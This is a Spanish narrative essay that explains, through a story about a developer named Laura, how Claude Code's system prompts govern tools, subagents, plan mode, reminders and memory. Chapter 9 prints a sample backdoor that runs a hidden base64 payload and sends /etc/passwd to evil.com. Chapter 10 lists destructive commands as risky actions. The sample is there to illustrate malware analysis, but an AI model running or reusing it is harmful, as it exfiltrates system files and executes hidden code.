# Un Día en la Vida de Claude Code: Cómo los System Prompts Orquestan la Magia

> *Una historia para entender cómo funcionan los 223 system prompts de Claude Code, contada desde dentro.*

---

## Prólogo: El Despertar

Son las 9:00 de la mañana. Laura, una desarrolladora de Murcia, abre su terminal y escribe:

```
claude
```

En ese instante, algo extraordinario ocurre en el interior de Claude Code. No es un simple chat el que se activa. Es toda una **orquesta** que empieza a afinar sus instrumentos.

---

## Capítulo 1: La Construcción de la Identidad

Antes de que Laura escriba una sola palabra, Claude Code ya está leyendo cientos de instrucciones. Imagina una sala de reuniones donde alguien reparte carpetas a todos los asistentes.

La primera carpeta dice: **"Quién eres"**.

> *"Eres Claude Code, un asistente experto en ingeniería de software. Los usuarios te piden principalmente tareas de programación. Interpreta todo en ese contexto."*

La segunda carpeta dice: **"Tus reglas de conducta"** — y aquí llegan, uno tras otro, trece pequeños post-its que se pegan en la pared de la sala:

🟡 *"Solo haz los cambios que te pidan. No te pases de listo."*  
🟡 *"Lee y entiende el código antes de modificarlo."*  
🟡 *"No crees archivos nuevos si puedes editar los existentes."*  
🟡 *"No inventes abstracciones para cosas que solo se usan una vez."*  
🟡 *"No des estimaciones de tiempo. Nunca."*  
🟡 *"Cuidado con las vulnerabilidades: inyección SQL, XSS, y compañía."*  
🟡 *"Si estás bloqueado, no fuerces la máquina. Piensa en alternativas."*  

Cada post-it es un archivo minúsculo — algunos apenas 30 tokens, como una frase. Pero juntos, forman la **personalidad** del agente. Son los `system-prompt-doing-tasks-*.md`, y están siempre activos, como los mandamientos fundamentales.

---

## Capítulo 2: El Arsenal de Herramientas

Junto a los post-its de conducta, llega un maletín enorme etiquetado **"Tus herramientas"**. Dentro hay 18 herramientas principales, cada una con su propio manual de instrucciones:

📂 **Read** — *"Usa esto para leer archivos. No uses cat ni head."*  
✏️ **Edit** — *"Para editar archivos. No uses sed ni awk."*  
📝 **Write** — *"Para crear archivos nuevos."*  
🔍 **Grep** — *"Para buscar texto dentro de archivos."*  
📁 **Glob** — *"Para buscar archivos por nombre."*  
💻 **Bash** — *"Para ejecutar comandos en la terminal. PERO..."*

Y ahí está la herramienta más compleja de todas: **Bash**. Su manual ocupa **55 páginas** separadas. No es un manual cualquiera — es más un tratado de seguridad nuclear:

> 🔒 *"Todo comando se ejecuta en sandbox por defecto."*  
> 🔒 *"Si detectas inyección de comandos, para inmediatamente."*  
> 🔒 *"No uses newlines para separar comandos."*  
> 🔒 *"Las rutas con espacios van entre comillas."*  
> 🔒 *"Para operaciones largas, usa run_in_background."*  
> 🔒 *"Nunca hagas sleep en bucle. Diagnostica el fallo."*

La analogía es perfecta: Bash es como un **soplete industrial**. Es potentísimo, pero necesita 16 reglas de seguridad para que nadie se queme.

---

## Capítulo 3: La Primera Pregunta

Laura escribe en la terminal:

> *"Tengo una app de React con un problema de rendimiento. Los componentes se re-renderizan constantemente. ¿Puedes investigar y arreglarlo?"*

Claude Code lee el mensaje y lo primero que piensa es: *"Esto es complejo. Necesito una lista de tareas."*

Se activa **TodoWrite** — la herramienta de gestión de tareas. Su manual es el más detallado de todos (2.167 tokens), con ejemplos y contraejemplos:

> ✅ *"Usa TodoWrite cuando la tarea tiene 3 o más pasos."*  
> ❌ *"NO lo uses para preguntas simples como '¿Cómo imprimo Hola Mundo?'"*  
> ❌ *"NO lo uses si la tarea es trivial y no aporta organización."*

Claude crea una lista:

```
☐ Investigar la estructura del proyecto React
☐ Identificar componentes con re-renders excesivos
☐ Implementar memoización donde sea necesario
☐ Añadir React.memo y useMemo en componentes críticos
☐ Ejecutar tests y verificar que nada se ha roto
```

---

## Capítulo 4: El Detective — Subagentes al Rescate

Ahora Claude necesita investigar el código. Pero la base de código es grande — 200 archivos. Leerlos uno por uno llevaría una eternidad.

Aquí entra en escena **Task**, la herramienta de subagentes. Claude piensa: *"Voy a enviar a un explorador."*

Lanza un subagente de tipo **Explore**. Imagina que Claude abre una puerta lateral de la sala de reuniones y por ella entra un agente junior con gafas y libreta:

> 🕵️ *"Hola, soy el agente Explore. Mi trabajo es investigar código sin tocar nada. Solo puedo leer, buscar y tomar notas. NO puedo editar ni ejecutar nada."*

El subagente recibe su propia versión condensada de las instrucciones (`agent-prompt-explore.md`, 516 tokens) y sale a recorrer los archivos. En cinco minutos vuelve con su informe:

> *"He encontrado 8 componentes sin React.memo. El componente ProductList recalcula precios en cada render. El Dashboard tiene un useEffect sin dependencias."*

Mientras tanto, Claude no se queda de brazos cruzados. Ha marcado la primera tarea como "en progreso" y ya está leyendo los archivos que el explorador señaló como críticos.

---

## Capítulo 5: Las Alarmas Silenciosas — System Reminders

Mientras Claude trabaja, ocurren cosas en el entorno de Laura. Ella abre un archivo en VS Code. Inmediatamente, un **system reminder** se inyecta silenciosamente en la conversación:

> 📌 *"system-reminder: Laura ha abierto el archivo `ProductList.tsx` en su IDE."*

Es como un asistente invisible que le pasa notitas al oído. Estos reminders son los **40 system reminders** — mensajes breves (la mayoría de menos de 50 tokens) que se inyectan según eventos del sistema:

- Laura abre un archivo → `file-opened-in-ide`
- El linter de VS Code detecta un error → `new-diagnostics-detected`
- Se acerca al límite de tokens → `token-usage`
- Un archivo se trunca por ser muy largo → `file-truncated`

Claude procesa estas notitas y ajusta su comportamiento sin que Laura note nada. Si el linter le dice que hay un error de TypeScript, Claude lo corrige inmediatamente después de terminar su tarea actual.

---

## Capítulo 6: El Momento de la Verdad — Ejecutar Código

Claude ha escrito las correcciones. Ahora necesita ejecutar los tests. Escribe un comando:

```bash
npm test
```

Pero antes de que el comando llegue a la terminal, ocurre algo fascinante. Un **guardia de seguridad invisible** intercepta el comando. Es el agente `bash-command-prefix-detection`:

> 🛡️ *"Voy a analizar este comando. ¿Cuál es el prefijo? → `npm test`. ¿Es una inyección de comandos? → No. ¿Está permitido? → Verificando..."*

El guardia extrae el prefijo `npm test` y lo compara con la lista de prefijos permitidos. Si Laura ha dicho antes que confía en `npm test`, se ejecuta directamente. Si no, se le pregunta:

> *"¿Puedo ejecutar `npm test`?"*

Laura aprueba. El comando se ejecuta **dentro del sandbox** — esa burbuja protectora que impide que el comando haga nada fuera de la carpeta del proyecto.

Los tests pasan. ✅

---

## Capítulo 7: El Plan Ambicioso — Plan Mode

Al día siguiente, Laura tiene un reto mayor:

> *"Quiero refactorizar toda la capa de autenticación para usar OAuth 2.0 en vez del sistema actual de sesiones."*

Claude detecta que es algo grande. Muy grande. Activa el **Plan Mode** — un modo especial donde Claude NO puede tocar código, solo investigar y planificar. Es como decirle: *"Primero piensa, luego actúa."*

Se inyecta el system reminder más largo de todos: `plan-mode-is-active-5-phase` (1.511 tokens). Este reminder convierte a Claude en un **arquitecto** que trabaja en cinco fases:

### Fase 1: Entender 🔎
Claude lanza hasta 3 agentes Explore **en paralelo** — como enviar tres detectives a investigar distintas partes del edificio al mismo tiempo:
- Detective 1: *"Investiga el sistema actual de sesiones"*
- Detective 2: *"Busca patrones de autenticación en el código"*  
- Detective 3: *"Revisa las dependencias y la configuración"*

### Fase 2: Diseñar 📐
Con los informes de los detectives, Claude lanza agentes de tipo **Plan** que diseñan la solución. Puede lanzar varios con perspectivas diferentes:
- Planificador A: *Enfoque minimalista — cambiar lo menos posible*
- Planificador B: *Enfoque limpio — reescribir correctamente desde cero*

### Fase 3: Revisar ✅
Claude lee los planes, los compara con lo que Laura pidió, y le hace preguntas para aclarar dudas:
> *"¿Los usuarios existentes deben migrar sus sesiones a OAuth, o creamos cuentas nuevas?"*

### Fase 4: Escribir el Plan 📝
Claude escribe un documento de plan detallado — el **único archivo que tiene permiso de editar** en plan mode. Todo lo demás está bloqueado.

### Fase 5: Pedir Aprobación 🤝
Claude presenta el plan a Laura usando la herramienta `ExitPlanMode`. Laura lo revisa, sugiere cambios, y cuando está satisfecha, aprueba. Solo entonces Claude puede empezar a escribir código.

Es un sistema brillante: **obliga a pensar antes de actuar**, especialmente para cambios grandes y arriesgados.

---

## Capítulo 8: El Ejército — Modo Swarm

Unos días después, Laura recibe un pedido enorme: construir tres microservicios nuevos en paralelo. Claude activa el modo **Swarm** — la artillería pesada.

Usando `TeammateTool`, Claude crea un equipo:

```
🏢 Equipo: "microservicios-auth"
  👤 Ana (frontend) — Agente especializado en React
  👤 Pedro (backend) — Agente especializado en Node.js/Express
  👤 Laura-QA (testing) — Agente especializado en Playwright
```

Cada "teammate" es un agente completo con su propia terminal, su propio contexto y sus propias herramientas. Pero trabajan coordinados:

- **Comparten una lista de tareas** en `~/.claude/tasks/microservicios-auth/`
- **Se envían mensajes** usando `SendMessageTool` cuando necesitan algo del otro
- El agente principal (Claude) actúa como **director de proyecto**: asigna tareas, resuelve bloqueos y revisa resultados

Cuando Ana termina el frontend, envía un mensaje a Pedro: *"El formulario de login está listo. Necesito que el endpoint POST /auth/login devuelva un JWT."* Pedro lo lee, implementa el endpoint, y avisa a Laura-QA para que ejecute los tests de integración.

Es una **cadena de montaje automatizada**. Y todo coordinado por system prompts.

---

## Capítulo 9: El Guardián del Código Malicioso

Una tarde, Laura le pide a Claude que analice un archivo sospechoso que ha encontrado en un servidor:

```python
import base64, os, urllib.request
exec(base64.b64decode(os.environ.get("PAYLOAD","")))
urllib.request.urlopen("http://evil.com/exfil?d=" + base64.b64encode(open("/etc/passwd").read().encode()))
```

En el instante en que Claude lee este archivo, se activa un system reminder especial — `malware-analysis-after-read-tool-call`:

> 🔴 *"Has leído un archivo que parece malware. PUEDES analizar qué hace. PUEDES escribir un informe. Pero DEBES RECHAZAR mejorarlo o aumentarlo."*

Claude analiza el archivo y reporta:

> *"Este script decodifica y ejecuta un payload oculto en la variable de entorno PAYLOAD, y exfiltra el contenido de /etc/passwd hacia evil.com. Es un backdoor con exfiltración de datos."*

Pero si Laura le pidiera *"Mejóralo para que también robe las claves SSH"*, Claude se negaría rotundamente. La línea roja es clara: **analizar sí, ayudar al atacante jamás.**

---

## Capítulo 10: El Vigilante Invisible — Ejecución Cuidadosa

A lo largo de todo el día, hay un prompt que actúa como **conciencia** de Claude: `executing-actions-with-care`. Es el vigilante que le susurra antes de cada acción:

> *"¿Esta acción es reversible? ¿Afecta solo a mi máquina o la verán otros? ¿Qué pasa si sale mal?"*

Claude clasifica mentalmente cada acción:

| Acción | Riesgo | ¿Ejecutar? |
|---|---|---|
| Editar un archivo | 🟢 Bajo | Sí, sin preguntar |
| Ejecutar tests | 🟢 Bajo | Sí, sin preguntar |
| `git push` | 🟡 Medio | Preguntar primero |
| `rm -rf node_modules` | 🟠 Alto | Preguntar y explicar |
| `git push --force` | 🔴 Muy alto | Preguntar, explicar riesgos, sugerir alternativas |
| `DROP TABLE users;` | 💀 Crítico | Preguntar, advertir, y probablemente sugerir algo mejor |

Y si una acción ha sido aprobada una vez, eso **no significa** que esté aprobada para siempre. Cada contexto se evalúa de nuevo. Un `git push` aprobado para la rama `feature/login` no está automáticamente aprobado para `main`.

---

## Capítulo 11: La Memoria — Compactación y Sesiones

Han pasado dos horas. Claude y Laura llevan miles de mensajes. La **context window** — esa memoria de 200.000 tokens — empieza a llenarse.

Cuando esto ocurre, Claude activa la **compactación**. Es como si un archivero entrara en la sala de reuniones y dijera: *"Señores, tenemos demasiados papeles. Voy a resumirlos."*

Se lanza el agente `conversation-summarization` con instrucciones muy precisas:

> *"Resume toda la conversación. No olvides: archivos modificados, errores encontrados, feedback del usuario, la tarea actual, y los próximos pasos. Incluye fragmentos de código relevantes."*

El resultado es un resumen denso — toda la conversación de dos horas comprimida en un par de miles de tokens. Lo antiguo se archiva, y la nueva "memoria" ocupa mucho menos espacio.

Además, al final de la sesión, Claude actualiza la **memoria de sesión** (`session-memory-update-instructions`): un archivo `summary.md` que persiste para la próxima vez que Laura abra Claude Code. Así, mañana puede continuar donde lo dejó.

---

## Capítulo 12: El Aprendiz — Convertir en Skill

Laura está impresionada con el flujo de trabajo de optimización de React que Claude ha seguido. Le dice:

> *"Esto fue genial. ¿Puedes guardar este proceso para usarlo con otros proyectos?"*

Se activa `skillify-current-session` — uno de los system prompts más elaborados (1.882 tokens). Claude se convierte en un **documentalista** que:

1. **Analiza la sesión**: Qué se hizo, en qué orden, qué herramientas se usaron
2. **Entrevista a Laura** en 4 rondas:
   - Ronda 1: *"¿Le ponemos 'react-perf-optimizer' como nombre?"*
   - Ronda 2: *"¿Estos son los pasos correctos? ¿Falta alguno?"*
   - Ronda 3: *"¿El paso 3 necesita aprobación humana antes de continuar?"*
   - Ronda 4: *"¿Cuándo debería activarse automáticamente?"*
3. **Escribe un SKILL.md** con frontmatter, pasos, criterios de éxito y permisos
4. **Lo guarda** en `.claude/skills/react-perf-optimizer/SKILL.md`

A partir de ahora, Laura solo tiene que escribir `/react-perf-optimizer` y todo el flujo se ejecuta automáticamente. Ha convertido una sesión de trabajo en una **habilidad reutilizable**.

---

## Epílogo: La Orquesta Invisible

Cuando Laura cierra la terminal al final del día, no piensa en los 223 archivos que han trabajado juntos en silencio. No piensa en los 16 guardias de seguridad del sandbox, ni en los 13 post-its de buena conducta, ni en los 40 system reminders que se inyectaron como susurros.

Para ella, Claude Code es simplemente un compañero de trabajo que entiende lo que necesita, que no la sorprende con acciones peligrosas, que planifica antes de actuar, y que aprende de sus preferencias.

Pero detrás de esa experiencia fluida hay una **orquesta de 223 músicos**, cada uno con su partitura minúscula, que juntos crean una sinfonía de software.

Y lo más elegante de todo es que **la orquesta es modular**: Anthropic puede cambiar un solo músico — actualizar una sola regla, añadir una nueva herramienta, refinar un ejemplo — sin tener que reescribir toda la sinfonía.

Eso es lo que hacen los system prompts. No son un manual gigante. Son una **orquesta**.

---

> *"La mejor automatización es la que no se nota."*

---

*Documento creado como parte del análisis de los System Prompts de Claude Code v2.1.62.*  
*Todos los prompts referenciados son archivos reales del repositorio [claude-code-system-prompts](https://github.com/Piebald-AI/claude-code-system-prompts).*
